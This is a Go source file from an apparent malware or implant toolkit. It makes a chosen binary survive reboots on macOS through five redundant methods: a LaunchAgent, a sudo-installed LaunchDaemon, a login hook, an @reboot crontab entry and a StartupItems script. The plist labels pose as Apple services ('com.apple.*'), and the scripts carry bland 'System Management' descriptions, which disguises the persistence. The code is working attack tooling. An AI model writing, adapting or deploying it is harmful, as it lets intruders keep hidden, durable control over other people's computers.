package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// InstallDarwin, applies all persistence methods for macOS
func InstallDarwin(binaryPath, serviceName string) error {
	var successCount int

	// Try all techniques
	if err := InstallDarwinLaunchAgent(binaryPath, serviceName); err == nil {
		successCount++
	}

	if err := InstallDarwinLaunchDaemon(binaryPath, serviceName); err == nil {
		successCount++
	}

	if err := InstallDarwinLoginHook(binaryPath); err == nil {
		successCount++
	}

	if err := InstallDarwinCrontab(binaryPath); err == nil {
		successCount++
	}

	if err := InstallDarwinRCScript(binaryPath, serviceName); err == nil {
		successCount++
	}

	if successCount > 0 {
		return nil
	}

	return fmt.Errorf("no macOS persistence method was successful")
}

// InstallDarwinLaunchAgent, creates a macOS LaunchAgent
func InstallDarwinLaunchAgent(binaryPath, serviceName string) error {
	// LaunchAgent plist content
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`, serviceName, binaryPath)

	// LaunchAgent directory
	launchAgentDir := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents")
	if err := os.MkdirAll(launchAgentDir, 0755); err != nil {
		return err
	}

	// Create Plist file
	plistPath := filepath.Join(launchAgentDir, fmt.Sprintf("com.apple.%s.plist", serviceName))
	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		return err
	}

	// Load LaunchAgent
	cmd := exec.Command("launchctl", "load", "-w", plistPath)
	if err := cmd.Run(); err != nil {
		return err
	}

	fmt.Println("LaunchAgent created and loaded")
	return nil
}

// InstallDarwinLaunchDaemon, creates a macOS LaunchDaemon (requires root)
func InstallDarwinLaunchDaemon(binaryPath, serviceName string) error {
	// LaunchDaemon plist content
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`, serviceName, binaryPath)

	// Create temporary file
	tempFile, err := os.CreateTemp("", "plist")
	if err != nil {
		return err
	}
	defer os.Remove(tempFile.Name())

	// Write to temporary file
	if _, err := tempFile.WriteString(plistContent); err != nil {
		return err
	}
	tempFile.Close()

	// Copy with root privileges
	plistPath := fmt.Sprintf("/Library/LaunchDaemons/com.apple.%s.plist", serviceName)
	copyCmd := exec.Command("sudo", "cp", tempFile.Name(), plistPath)
	if err := copyCmd.Run(); err != nil {
		// If root privileges are not available, only create the file
		return fmt.Errorf("LaunchDaemon creation failed (root required): %v", err)
	}

	// Set permissions
	chownCmd := exec.Command("sudo", "chown", "root:wheel", plistPath)
	chownCmd.Run()

	chmodCmd := exec.Command("sudo", "chmod", "644", plistPath)
	chmodCmd.Run()

	// Load LaunchDaemon
	loadCmd := exec.Command("sudo", "launchctl", "load", "-w", plistPath)
	if err := loadCmd.Run(); err != nil {
		return err
	}

	fmt.Println("LaunchDaemon created and loaded")
	return nil
}

// InstallDarwinLoginHook, creates a macOS login hook
func InstallDarwinLoginHook(binaryPath string) error {
	// Login hook script content
	scriptContent := fmt.Sprintf(`#!/bin/sh
# Login hook for system management
%s &
exit 0
`, binaryPath)

	// Create script file
	scriptPath := filepath.Join(os.Getenv("HOME"), ".login_hook.sh")
	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0755); err != nil {
		return err
	}

	// Set login hook
	cmd := exec.Command("defaults", "write", "com.apple.loginwindow", "LoginHook", scriptPath)
	if err := cmd.Run(); err != nil {
		return err
	}

	fmt.Println("Login hook created")
	return nil
}

// InstallDarwinCrontab, adds a command to macOS crontab
func InstallDarwinCrontab(binaryPath string) error {
	// Create temporary file
	cronFile, err := os.CreateTemp("", "cron")
	if err != nil {
		return err
	}
	defer os.Remove(cronFile.Name())

	// Get current crontab
	cmd := exec.Command("crontab", "-l")
	output, _ := cmd.Output()

	// New crontab content
	newCron := string(output)
	if !strings.Contains(newCron, binaryPath) {
		newCron += fmt.Sprintf("\n@reboot %s\n", binaryPath)

		// Write to temporary file
		if err := os.WriteFile(cronFile.Name(), []byte(newCron), 0644); err != nil {
			return err
		}

		// Update crontab
		installCmd := exec.Command("crontab", cronFile.Name())
		if err := installCmd.Run(); err != nil {
			return err
		}
	}

	fmt.Println("Command added to crontab")
	return nil
}

// InstallDarwinRCScript, creates a macOS RC script
func InstallDarwinRCScript(binaryPath, serviceName string) error {
	// RC script directory
	rcScriptPath := "/Library/StartupItems/" + serviceName

	// Create temporary script and plist files
	scriptContent := fmt.Sprintf(`#!/bin/sh
# %s startup script

. /etc/rc.common

StartService() {
    ConsoleMessage "Starting System Manager"
    "%s" &
}

StopService() {
    ConsoleMessage "Stopping System Manager"
    killall $(basename "%s")
}

RestartService() {
    StopService
    StartService
}

RunService "$1"
`, serviceName, binaryPath, binaryPath)

	// Plist content
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
    <string>System Management Service</string>
    <key>OrderPreference</key>
    <string>Late</string>
    <key>Provides</key>
    <array>
        <string>%s</string>
    </array>
</dict>
</plist>`, serviceName)

	// Create temporary files
	tempScript, err := os.CreateTemp("", "script")
	if err != nil {
		return err
	}
	defer os.Remove(tempScript.Name())

	tempPlist, err := os.CreateTemp("", "plist")
	if err != nil {
		return err
	}
	defer os.Remove(tempPlist.Name())

	// Write to temporary files
	if _, err := tempScript.WriteString(scriptContent); err != nil {
		return err
	}
	tempScript.Close()

	if _, err := tempPlist.WriteString(plistContent); err != nil {
		return err
	}
	tempPlist.Close()

	// Create directory with root privileges and copy files
	mkdirCmd := exec.Command("sudo", "mkdir", "-p", rcScriptPath)
	if err := mkdirCmd.Run(); err != nil {
		return fmt.Errorf("RC script directory creation failed (root required): %v", err)
	}

	scriptDest := filepath.Join(rcScriptPath, serviceName)
	plistDest := filepath.Join(rcScriptPath, "StartupParameters.plist")

	copyScriptCmd := exec.Command("sudo", "cp", tempScript.Name(), scriptDest)
	if err := copyScriptCmd.Run(); err != nil {
		return err
	}

	copyPlistCmd := exec.Command("sudo", "cp", tempPlist.Name(), plistDest)
	if err := copyPlistCmd.Run(); err != nil {
		return err
	}

	// Set permissions
	chmodCmd := exec.Command("sudo", "chmod", "755", scriptDest)
	chmodCmd.Run()

	fmt.Println("RC script created")
	return nil
}
